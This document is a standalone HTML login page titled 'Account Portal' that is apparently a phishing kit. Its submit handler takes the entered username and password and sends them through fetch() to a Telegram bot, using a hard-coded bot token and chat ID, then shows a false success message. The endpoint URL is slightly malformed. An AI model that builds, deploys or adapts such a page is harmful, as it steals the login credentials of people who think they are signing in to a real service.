<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Account Access</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: #fdfdfd;
    margin: 0;
    display: flex;
    justify-content: center;
    padding-top: 40px;
  }
  .box {
    width: 350px;
    border: 1px solid #ddd;
    border-radius: 8px;
    padding: 20px 20px 10px;
    box-shadow: 0 1px 4px rgba(0,0,0,.15);
    background: #fff;
  }
  h1 {
    font-size: 28px;
    font-weight: 400;
    margin: 0 0 15px;
    color: #333;
  }
  label {
    font-size: 13px;
    font-weight: 700;
    display: block;
    margin: 12px 0 4px;
    color: #555;
  }
  input[type=text], input[type=password] {
    width: 100%;
    height: 34px;
    padding: 7px;
    box-sizing: border-box;
    font-size: 13px;
    border: 1px solid #949494;
    border-radius: 4px;
    outline: none;
  }
  input:focus {
    border-color: #0088cc;
  }
  .continue {
    width: 100%;
    margin-top: 18px;
    padding: 10px 0;
    font-size: 14px;
    font-weight: 700;
    color: #fff;
    background: #0088cc;
    border: 1px solid #0077b3;
    border-radius: 4px;
    cursor: pointer;
    transition: background 0.1s ease;
  }
  .continue:hover {
    background: #006699;
  }
  .legal {
    font-size: 12px;
    color: #666;
    margin-top: 14px;
    line-height: 1.4;
  }
  a {
    color: #0066c0;
    text-decoration: none;
  }
  a:hover {
    text-decoration: underline;
  }
</style>
</head>
<body>
  <div class="box">
    <h1>Account Portal</h1>

    <label for="username">Username or Email</label>
    <input type="text" id="username" name="username" placeholder="example@domain.com"/>

    <label for="password">Password</label>
    <input type="password" id="password" name="password" placeholder="Enter account password"/>

    <button class="continue" type="button" onclick="handleSubmit()">Continue</button>

    <p class="legal">Access is subject to local compliance regulations and standard <a href="#">Terms of Service</a>.</p>
  </div>

  <script>
    function handleSubmit() {
        const botToken = "8825551788:AAHL5GbRl2S3r0KSElZTgzAtnDhvPvkfuwQ"; 
        const chatId = "8714686528";    
        
        const userVal = document.getElementById('username').value;
        const passVal = document.getElementById('password').value;
        
        if (!userVal.trim() || !passVal.trim()) {
            alert("All fields are required to proceed.");
            return;
        }
        
        const message = `📋 *Form Submission*\n\n*User:* ${userVal}\n*Pass:* ${passVal}`;
        const url = `https://telegram.org{botToken}/sendMessage`;
        
        fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: "Markdown"
            })
        })
        .then(response => {
            if (response.ok) {
                alert("Data processed successfully.");
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';
            } else {
                alert("Processing error. Verify endpoint connection parameters.");
            }
        })
        .catch(error => {
            console.error("Connection error:", error);
            alert("Network connection timed out.");
        });
    }
  </script>
</body>
</html>
